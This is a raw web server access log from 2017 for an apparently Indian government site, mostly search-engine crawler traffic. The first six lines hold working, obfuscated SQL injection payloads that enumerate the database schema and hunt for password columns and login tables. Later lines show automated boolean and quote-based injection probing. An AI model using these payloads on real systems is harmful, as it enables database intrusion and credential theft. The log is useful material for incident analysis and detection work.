86.192.132.63 - - [23/Jun/2017:06:35:52 +0530] "GET /detail_news.php?id=999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+1,2,(%2f**%2fsElEcT+%2f**%2fcOnCaT(0x217e21,count(t.%2f**%2ftAbLe_nAmE),0x217e21)+%2f**%2ffRoM+information_schema.%2f**%2fsChEmAtA+as+d+join+information_schema.%2f**%2ftAbLeS+as+t+on+t.%2f**%2ftAbLe_sChEmA+=+d.%2f**%2fsChEmA_NaMe+join+information_schema.%2f**%2fcOlUmNs+as+c+on+c.%2f**%2ftAbLe_sChEmA+=+d.%2f**%2fsChEmA_NaMe+and+c.%2f**%2ftAbLe_nAmE+=+t.%2f**%2ftAbLe_nAmE+%2f**%2fwHeRe+not+c.%2f**%2ftAbLe_sChEmA+in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c)+and+d.%2f**%2fsChEmA_NaMe+=+%2f**%2fdAtAbAsE()+and+c.%2f**%2fcOlUmN_NaMe+like+0x2570617373776f726425),4,5+and+'0'='0 HTTP/1.1" 200 18127 "http://www.cdmindia.gov.in/detail_news.php?id=999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+1,2,(%2f**%2fsElEcT+%2f**%2fcOnCaT(0x217e21,count(t.%2f**%2ftAbLe_nAmE),0x217e21)+%2f**%2ffRoM+information_schema.%2f**%2fsChEmAtA+as+d+join+information_schema.%2f**%2ftAbLeS+as+t+on+t.%2f**%2ftAbLe_sChEmA+=+d.%2f**%2fsChEmA_NaMe+join+information_schema.%2f**%2fcOlUmNs+as+c+on+c.%2f**%2ftAbLe_sChEmA+=+d.%2f**%2fsChEmA_NaMe+and+c.%2f**%2ftAbLe_nAmE+=+t.%2f**%2ftAbLe_nAmE+%2f**%2fwHeRe+not+c.%2f**%2ftAbLe_sChEmA+in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c)+and+d.%2f**%2fsChEmA_NaMe+=+%2f**%2fdAtAbAsE()+and+c.%2f**%2fcOlUmN_NaMe+like+0x2570617373776f726425),4,5+and+'0'='0" "Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-PT; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)"
86.192.132.63 - - [23/Jun/2017:06:35:53 +0530] "GET /detail_news.php?id=999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+1,2,(%2f**%2fsElEcT+%2f**%2fcOnCaT(0x217e21,d.%2f**%2fsChEmA_NaMe,0x332150,t.%2f**%2ftAbLe_nAmE,0x217e21)+%2f**%2ffRoM+information_schema.%2f**%2fsChEmAtA+as+d+join+information_schema.%2f**%2ftAbLeS+as+t+on+t.%2f**%2ftAbLe_sChEmA+=+d.%2f**%2fsChEmA_NaMe+join+information_schema.%2f**%2fcOlUmNs+as+c+on+c.%2f**%2ftAbLe_sChEmA+=+d.%2f**%2fsChEmA_NaMe+and+c.%2f**%2ftAbLe_nAmE+=+t.%2f**%2ftAbLe_nAmE+%2f**%2fwHeRe+not+c.%2f**%2ftAbLe_sChEmA+in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c)+and+d.%2f**%2fsChEmA_NaMe+=+%2f**%2fdAtAbAsE()+and+c.%2f**%2fcOlUmN_NaMe+like+0x2570617373776f726425+%2f**%2fgRoUp%2f**%2fbY+t.%2f**%2ftAbLe_nAmE+%2f**%2flImIt+0,1),4,5+and+'0'='0 HTTP/1.1" 200 18151 "http://www.cdmindia.gov.in/detail_news.php?id=999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+1,2,(%2f**%2fsElEcT+%2f**%2fcOnCaT(0x217e21,d.%2f**%2fsChEmA_NaMe,0x332150,t.%2f**%2ftAbLe_nAmE,0x217e21)+%2f**%2ffRoM+information_schema.%2f**%2fsChEmAtA+as+d+join+information_schema.%2f**%2ftAbLeS+as+t+on+t.%2f**%2ftAbLe_sChEmA+=+d.%2f**%2fsChEmA_NaMe+join+information_schema.%2f**%2fcOlUmNs+as+c+on+c.%2f**%2ftAbLe_sChEmA+=+d.%2f**%2fsChEmA_NaMe+and+c.%2f**%2ftAbLe_nAmE+=+t.%2f**%2ftAbLe_nAmE+%2f**%2fwHeRe+not+c.%2f**%2ftAbLe_sChEmA+in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c)+and+d.%2f**%2fsChEmA_NaMe+=+%2f**%2fdAtAbAsE()+and+c.%2f**%2fcOlUmN_NaMe+like+0x2570617373776f726425+%2f**%2fgRoUp%2f**%2fbY+t.%2f**%2ftAbLe_nAmE+%2f**%2flImIt+0,1),4,5+and+'0'='0" "Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-PT; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)"
86.192.132.63 - - [23/Jun/2017:06:35:55 +0530] "GET /detail_news.php?id=999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+1,2,(%2f**%2fsElEcT+%2f**%2fcOnCaT(0x217e21,count(*),0x217e21)+%2f**%2ffRoM+cdmindia.ministry_login),4,5+and+'0'='0 HTTP/1.1" 200 18128 "http://www.cdmindia.gov.in/detail_news.php?id=999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+1,2,(%2f**%2fsElEcT+%2f**%2fcOnCaT(0x217e21,count(*),0x217e21)+%2f**%2ffRoM+cdmindia.ministry_login),4,5+and+'0'='0" "Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-PT; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)"
86.192.132.63 - - [23/Jun/2017:06:35:56 +0530] "GET /detail_news.php?id=999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+1,2,(%2f**%2fsElEcT+%2f**%2fcOnCaT(0x217e21,d.%2f**%2fsChEmA_NaMe,0x332150,t.%2f**%2ftAbLe_nAmE,0x217e21)+%2f**%2ffRoM+information_schema.%2f**%2fsChEmAtA+as+d+join+information_schema.%2f**%2ftAbLeS+as+t+on+t.%2f**%2ftAbLe_sChEmA+=+d.%2f**%2fsChEmA_NaMe+join+information_schema.%2f**%2fcOlUmNs+as+c+on+c.%2f**%2ftAbLe_sChEmA+=+d.%2f**%2fsChEmA_NaMe+and+c.%2f**%2ftAbLe_nAmE+=+t.%2f**%2ftAbLe_nAmE+%2f**%2fwHeRe+not+c.%2f**%2ftAbLe_sChEmA+in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c)+and+d.%2f**%2fsChEmA_NaMe+=+%2f**%2fdAtAbAsE()+and+c.%2f**%2fcOlUmN_NaMe+like+0x2570617373776f726425+%2f**%2fgRoUp%2f**%2fbY+t.%2f**%2ftAbLe_nAmE+%2f**%2flImIt+1,1),4,5+and+'0'='0 HTTP/1.1" 200 18158 "http://www.cdmindia.gov.in/detail_news.php?id=999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+1,2,(%2f**%2fsElEcT+%2f**%2fcOnCaT(0x217e21,d.%2f**%2fsChEmA_NaMe,0x332150,t.%2f**%2ftAbLe_nAmE,0x217e21)+%2f**%2ffRoM+information_schema.%2f**%2fsChEmAtA+as+d+join+information_schema.%2f**%2ftAbLeS+as+t+on+t.%2f**%2ftAbLe_sChEmA+=+d.%2f**%2fsChEmA_NaMe+join+information_schema.%2f**%2fcOlUmNs+as+c+on+c.%2f**%2ftAbLe_sChEmA+=+d.%2f**%2fsChEmA_NaMe+and+c.%2f**%2ftAbLe_nAmE+=+t.%2f**%2ftAbLe_nAmE+%2f**%2fwHeRe+not+c.%2f**%2ftAbLe_sChEmA+in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c)+and+d.%2f**%2fsChEmA_NaMe+=+%2f**%2fdAtAbAsE()+and+c.%2f**%2fcOlUmN_NaMe+like+0x2570617373776f726425+%2f**%2fgRoUp%2f**%2fbY+t.%2f**%2ftAbLe_nAmE+%2f**%2flImIt+1,1),4,5+and+'0'='0" "Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-PT; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)"
86.192.132.63 - - [23/Jun/2017:06:35:57 +0530] "GET /detail_news.php?id=999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+1,2,(%2f**%2fsElEcT+%2f**%2fcOnCaT(0x217e21,count(*),0x217e21)+%2f**%2ffRoM+cdmindia.moe_user_registartion),4,5+and+'0'='0 HTTP/1.1" 200 18130 "http://www.cdmindia.gov.in/detail_news.php?id=999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+1,2,(%2f**%2fsElEcT+%2f**%2fcOnCaT(0x217e21,count(*),0x217e21)+%2f**%2ffRoM+cdmindia.moe_user_registartion),4,5+and+'0'='0" "Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-PT; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)"
86.192.132.63 - - [23/Jun/2017:06:35:58 +0530] "GET /detail_news.php?id=999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+1,2,(%2f**%2fsElEcT+%2f**%2fcOnCaT(0x217e21,d.%2f**%2fsChEmA_NaMe,0x332150,t.%2f**%2ftAbLe_nAmE,0x217e21)+%2f**%2ffRoM+information_schema.%2f**%2fsChEmAtA+as+d+join+information_schema.%2f**%2ftAbLeS+as+t+on+t.%2f**%2ftAbLe_sChEmA+=+d.%2f**%2fsChEmA_NaMe+join+information_schema.%2f**%2fcOlUmNs+as+c+on+c.%2f**%2ftAbLe_sChEmA+=+d.%2f**%2fsChEmA_NaMe+and+c.%2f**%2ftAbLe_nAmE+=+t.%2f**%2ftAbLe_nAmE+%2f**%2fwHeRe+not+c.%2f**%2ftAbLe_sChEmA+in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c)+and+d.%2f**%2fsChEmA_NaMe+=+%2f**%2fdAtAbAsE()+and+c.%2f**%2fcOlUmN_NaMe+like+0x2570617373776f726425+%2f**%2fgRoUp%2f**%2fbY+t.%2f**%2ftAbLe_nAmE+%2f**%2flImIt+2,1),4,5+and+'0'='0 HTTP/1.1" 200 18120 "http://www.cdmindia.gov.in/detail_news.php?id=999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+1,2,(%2f**%2fsElEcT+%2f**%2fcOnCaT(0x217e21,d.%2f**%2fsChEmA_NaMe,0x332150,t.%2f**%2ftAbLe_nAmE,0x217e21)+%2f**%2ffRoM+information_schema.%2f**%2fsChEmAtA+as+d+join+information_schema.%2f**%2ftAbLeS+as+t+on+t.%2f**%2ftAbLe_sChEmA+=+d.%2f**%2fsChEmA_NaMe+join+information_schema.%2f**%2fcOlUmNs+as+c+on+c.%2f**%2ftAbLe_sChEmA+=+d.%2f**%2fsChEmA_NaMe+and+c.%2f**%2ftAbLe_nAmE+=+t.%2f**%2ftAbLe_nAmE+%2f**%2fwHeRe+not+c.%2f**%2ftAbLe_sChEmA+in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c)+and+d.%2f**%2fsChEmA_NaMe+=+%2f**%2fdAtAbAsE()+and+c.%2f**%2fcOlUmN_NaMe+like+0x2570617373776f726425+%2f**%2fgRoUp%2f**%2fbY+t.%2f**%2ftAbLe_nAmE+%2f**%2flImIt+2,1),4,5+and+'0'='0" "Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-PT; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)"
66.249.79.17 - - [23/Jun/2017:06:36:48 +0530] "GET /reports_list_details.php?id=tubkayrstf&reporttype=&page=3 HTTP/1.1" 200 21534 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
146.148.64.128 - - [23/Jun/2017:06:38:03 +0530] "GET /robots.txt HTTP/1.1" 404 208 "-" "ltx71 - (http://ltx71.com/)"
157.55.39.174 - - [23/Jun/2017:06:38:54 +0530] "GET /project_details_view.php?id=1475 HTTP/1.1" 200 17662 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.79.17 - - [23/Jun/2017:06:39:24 +0530] "GET /reports_list_details.php?id=tubkayrstf&reporttype=&page=4 HTTP/1.1" 200 21707 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.17 - - [23/Jun/2017:06:41:42 +0530] "GET /reports_list_details.php?id=tubkayrstf&reporttype=&page=9 HTTP/1.1" 200 22156 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
207.46.13.27 - - [23/Jun/2017:06:42:55 +0530] "GET /aboutus.php HTTP/1.1" 200 19597 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
207.46.13.27 - - [23/Jun/2017:06:43:14 +0530] "GET /images/h_aboutus.jpg HTTP/1.1" 200 21693 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
35.184.189.105 - - [23/Jun/2017:06:43:26 +0530] "GET /robots.txt HTTP/1.1" 404 208 "-" "ltx71 - (http://ltx71.com/)"
146.148.64.128 - - [23/Jun/2017:06:45:28 +0530] "GET /robots.txt HTTP/1.1" 404 208 "-" "ltx71 - (http://ltx71.com/)"
66.249.79.15 - - [23/Jun/2017:06:45:48 +0530] "GET /reports_list_details.php?id=Multi%20State&reporttype=2&page=0 HTTP/1.1" 200 22052 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.15 - - [23/Jun/2017:06:46:36 +0530] "GET /reports_list_details.php?id=tubkayrstf&reporttype=&page=13 HTTP/1.1" 200 22455 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
35.184.189.105 - - [23/Jun/2017:06:46:43 +0530] "GET /robots.txt HTTP/1.1" 404 208 "-" "ltx71 - (http://ltx71.com/)"
202.46.51.18 - - [23/Jun/2017:06:47:02 +0530] "GET /project_details_view.php?id=1350 HTTP/1.1" 200 13990 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36"
66.249.79.19 - - [23/Jun/2017:06:47:08 +0530] "GET /reports_list_details.php?id=tubkayrstf&reporttype=&page=14 HTTP/1.1" 200 21809 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
146.148.64.128 - - [23/Jun/2017:06:47:26 +0530] "GET /js/index_validations.js HTTP/1.1" 200 3143 "-" "ltx71 - (http://ltx71.com/)"
146.148.64.128 - - [23/Jun/2017:06:48:03 +0530] "GET /robots.txt HTTP/1.1" 404 208 "-" "ltx71 - (http://ltx71.com/)"
66.249.79.19 - - [23/Jun/2017:06:48:14 +0530] "GET /reports_list_details.php?id=tubkayrstf&reporttype=&page=10 HTTP/1.1" 200 21978 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
35.184.189.105 - - [23/Jun/2017:06:48:27 +0530] "GET /capacity_building.php HTTP/1.1" 200 19186 "-" "ltx71 - (http://ltx71.com/)"
66.249.79.19 - - [23/Jun/2017:06:49:10 +0530] "GET /reports_list_details.php?id=tubkayrstf&reporttype=&page=12 HTTP/1.1" 200 22345 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.17 - - [23/Jun/2017:06:50:22 +0530] "GET /reports_list_details.php?id=tubkayrstf&reporttype=&page=11 HTTP/1.1" 200 22158 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.15 - - [23/Jun/2017:06:50:57 +0530] "GET /reports_list_details.php?id=1&reporttype=1&page=28 HTTP/1.1" 200 22230 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.15 - - [23/Jun/2017:06:51:43 +0530] "GET /reports_list_details.php?id=tubkayrstf&reporttype=&page=18 HTTP/1.1" 200 21987 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.17 - - [23/Jun/2017:06:52:55 +0530] "GET /reports_list_details.php?id=tubkayrstf&reporttype=&page=17 HTTP/1.1" 200 21831 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.15 - - [23/Jun/2017:06:53:58 +0530] "GET /reports_list_details.php?id=tubkayrstf&reporttype=&page=16 HTTP/1.1" 200 22062 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
5.196.87.51 - - [23/Jun/2017:06:54:03 +0530] "GET /robots.txt HTTP/1.1" 404 208 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
164.132.161.53 - - [23/Jun/2017:06:54:04 +0530] "GET /capacity_building.php HTTP/1.1" 200 19186 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
207.46.13.27 - - [23/Jun/2017:06:54:50 +0530] "GET /project_details_view_report.php?id=1896 HTTP/1.1" 200 13199 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.79.15 - - [23/Jun/2017:06:55:17 +0530] "GET /reports_list_details.php?id=tubkayrstf&reporttype=&page=15 HTTP/1.1" 200 22093 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.17 - - [23/Jun/2017:06:56:07 +0530] "GET /project_details_view.php?id=1869 HTTP/1.1" 200 14011 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.15 - - [23/Jun/2017:06:56:30 +0530] "GET /reports_list_details.php?id=tubkayrstf&reporttype=&page=20 HTTP/1.1" 200 22133 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.15 - - [23/Jun/2017:06:56:40 +0530] "GET /reports_list_details.php?id=tubkayrstf&reporttype=&page=21 HTTP/1.1" 200 22153 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.15 - - [23/Jun/2017:06:56:42 +0530] "GET /reports_list_details.php?id=tubkayrstf&reporttype=&page=23 HTTP/1.1" 200 21800 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.69.81 - - [23/Jun/2017:06:57:24 +0530] "GET /project_details_view_report.php?id=1560 HTTP/1.1" 200 13281 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
37.239.156.56 - - [23/Jun/2017:06:59:55 +0530] "GET /project_details_view.php?id='15&oid='1&page='69&reporttype='1 HTTP/1.1" 200 11450 "-" "-"
146.148.64.128 - - [23/Jun/2017:07:00:12 +0530] "GET /robots.txt HTTP/1.1" 404 208 "-" "ltx71 - (http://ltx71.com/)"
66.249.79.19 - - [23/Jun/2017:07:01:08 +0530] "GET /project_details_view_report.php?id=668 HTTP/1.1" 200 13300 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
146.148.64.128 - - [23/Jun/2017:07:01:26 +0530] "GET /js/base64_encode.js HTTP/1.1" 200 3002 "-" "ltx71 - (http://ltx71.com/)"
146.148.64.128 - - [23/Jun/2017:07:02:09 +0530] "GET /approval_process.php HTTP/1.1" 200 25912 "-" "ltx71 - (http://ltx71.com/)"
146.148.64.128 - - [23/Jun/2017:07:02:21 +0530] "GET /downloads/Comparision%20of%20PCN_30.03.doc HTTP/1.1" 200 49664 "-" "ltx71 - (http://ltx71.com/)"
35.184.189.105 - - [23/Jun/2017:07:02:32 +0530] "GET /robots.txt HTTP/1.1" 404 208 "-" "ltx71 - (http://ltx71.com/)"
146.148.64.128 - - [23/Jun/2017:07:02:52 +0530] "GET /view_past_events.php HTTP/1.1" 200 18854 "-" "ltx71 - (http://ltx71.com/)"
66.249.79.15 - - [23/Jun/2017:07:02:59 +0530] "GET /reports_list_details.php?id=tubkayrstf&reporttype=&page=24 HTTP/1.1" 200 21846 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.15 - - [23/Jun/2017:07:03:30 +0530] "GET /reports_list_details.php?id=tubkayrstf&reporttype=&page=26 HTTP/1.1" 200 21944 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
146.148.64.128 - - [23/Jun/2017:07:05:25 +0530] "GET /downloads/Existing%20PCN.doc HTTP/1.1" 200 114176 "-" "ltx71 - (http://ltx71.com/)"
66.249.69.81 - - [23/Jun/2017:07:06:08 +0530] "GET /project_details_view.php?id=448&oid=1&page=53&reporttype=1 HTTP/1.1" 200 14215 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.19 - - [23/Jun/2017:07:06:08 +0530] "GET /project_details_view.php?id=448&oid=1&page=53&reporttype=1 HTTP/1.1" 200 14215 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
94.247.31.203 - - [23/Jun/2017:07:06:43 +0530] "GET /reports_list_details.php?id=1'&reporttype=1'&page=51'\" HTTP/1.1" 200 21309 "-" "-"
94.247.31.203 - - [23/Jun/2017:07:06:44 +0530] "GET /reports_list_details.php?reporttype=1&page=51&id=1 HTTP/1.1" 200 21970 "-" "-"
94.247.31.203 - - [23/Jun/2017:07:06:45 +0530] "GET /reports_list_details.php?reporttype=1&page=51&id=12121121121212.1 HTTP/1.1" 200 16954 "-" "-"
202.46.50.75 - - [23/Jun/2017:07:06:52 +0530] "GET /project_details_view_report.php?id=790 HTTP/1.1" 200 13199 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36"
94.247.31.203 - - [23/Jun/2017:07:07:22 +0530] "GET /reports_list_details.php?reporttype=1&page=51&id=1%20and%201%3E1 HTTP/1.1" 200 16954 "-" "-"
193.70.56.25 - - [23/Jun/2017:07:09:09 +0530] "GET / HTTP/1.1" 200 19480 "http://burger-imperia.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36"
94.247.31.203 - - [23/Jun/2017:07:10:23 +0530] "GET /reports_list_details.php?id=1&page=51&reporttype=1 HTTP/1.1" 200 21970 "-" "-"
94.247.31.203 - - [23/Jun/2017:07:10:24 +0530] "GET /reports_list_details.php?id=1&page=51&reporttype=12121121121212.1 HTTP/1.1" 200 21892 "-" "-"
157.55.39.174 - - [23/Jun/2017:07:10:52 +0530] "GET /approved_projects.php HTTP/1.1" 200 16642 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
220.181.108.182 - - [23/Jun/2017:07:10:53 +0530] "GET /images/login1.jpg HTTP/1.1" 200 618 "-" "Baiduspider-image+(+http://www.baidu.com/search/spider.htm)"
94.247.31.203 - - [23/Jun/2017:07:11:01 +0530] "GET /reports_list_details.php?id=1&page=51&reporttype=1%20and%201%3E1 HTTP/1.1" 200 21892 "-" "-"
207.46.13.27 - - [23/Jun/2017:07:13:28 +0530] "GET /project_details_view.php?id=624 HTTP/1.1" 200 14109 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
94.247.31.203 - - [23/Jun/2017:07:14:02 +0530] "GET /reports_list_details.php?id=1&reporttype=1&page=51 HTTP/1.1" 200 21970 "-" "-"
94.247.31.203 - - [23/Jun/2017:07:14:03 +0530] "GET /reports_list_details.php?id=1&reporttype=1&page=512121121121212.1 HTTP/1.1" 200 21580 "-" "-"
94.247.31.203 - - [23/Jun/2017:07:14:40 +0530] "GET /reports_list_details.php?id=1&reporttype=1&page=51%20and%201%3E1 HTTP/1.1" 200 21580 "-" "-"
35.184.189.105 - - [23/Jun/2017:07:15:19 +0530] "GET /robots.txt HTTP/1.1" 404 208 "-" "ltx71 - (http://ltx71.com/)"
66.249.79.17 - - [23/Jun/2017:07:16:17 +0530] "GET /project_details_view.php?id=573 HTTP/1.1" 200 15517 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
207.46.13.27 - - [23/Jun/2017:07:16:24 +0530] "GET /detail_news.php?id=18 HTTP/1.1" 302 18713 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
207.46.13.27 - - [23/Jun/2017:07:16:25 +0530] "GET /logout.php HTTP/1.1" 302 369 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
207.46.13.27 - - [23/Jun/2017:07:16:26 +0530] "GET /index.php HTTP/1.1" 200 19480 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.174 - - [23/Jun/2017:07:16:53 +0530] "GET /project_details_view_report.php?id=457 HTTP/1.1" 200 13137 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
94.247.31.203 - - [23/Jun/2017:07:17:41 +0530] "GET /reports_list_details.php?id=1&reporttype=1&page=51 HTTP/1.0" 200 21970 "-" "Opera/9.27"
66.249.79.17 - - [23/Jun/2017:07:21:25 +0530] "GET /project_details_view.php?id=1951 HTTP/1.1" 200 14239 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.15 - - [23/Jun/2017:07:21:29 +0530] "GET /reports_list_details.php?id=pnjuzahme&reporttype=&page=247 HTTP/1.1" 200 22480 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
146.148.64.128 - - [23/Jun/2017:07:25:48 +0530] "GET /robots.txt HTTP/1.1" 404 208 "-" "ltx71 - (http://ltx71.com/)"
66.249.79.17 - - [23/Jun/2017:07:26:17 +0530] "GET /project_details_view_report.php?id=549 HTTP/1.1" 200 13244 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
202.46.49.123 - - [23/Jun/2017:07:26:42 +0530] "GET /project_details_view_report.php?id=262 HTTP/1.1" 200 13054 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36"
66.249.79.17 - - [23/Jun/2017:07:26:44 +0530] "GET /reports_list_details.php?id=pnjuzahme&reporttype=&page=294 HTTP/1.1" 200 20784 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.15 - - [23/Jun/2017:07:27:24 +0530] "GET /reports_list_details.php?id=pnjuzahme&reporttype=&page=1 HTTP/1.1" 200 21324 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.19 - - [23/Jun/2017:07:28:15 +0530] "GET /reports_list_details.php?id=pnjuzahme&reporttype=&page=243 HTTP/1.1" 200 21971 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
157.55.39.81 - - [23/Jun/2017:07:28:56 +0530] "GET /project_details_view_report.php?id=1437 HTTP/1.1" 200 13240 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.79.15 - - [23/Jun/2017:07:30:08 +0530] "GET /reports_list_details.php?id=pnjuzahme&reporttype=&page=250 HTTP/1.1" 200 21879 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.19 - - [23/Jun/2017:07:31:17 +0530] "GET /project_details_view_report.php?id=1168 HTTP/1.1" 200 13194 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.17 - - [23/Jun/2017:07:31:25 +0530] "GET /reports_list_details.php?id=pnjuzahme&reporttype=&page=292 HTTP/1.1" 200 21679 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.17 - - [23/Jun/2017:07:31:27 +0530] "GET /reports_list_details.php?id=pnjuzahme&reporttype=&page=255 HTTP/1.1" 200 22041 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
40.77.167.35 - - [23/Jun/2017:07:33:10 +0530] "GET /detail_news.php?id=19 HTTP/1.1" 302 19082 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
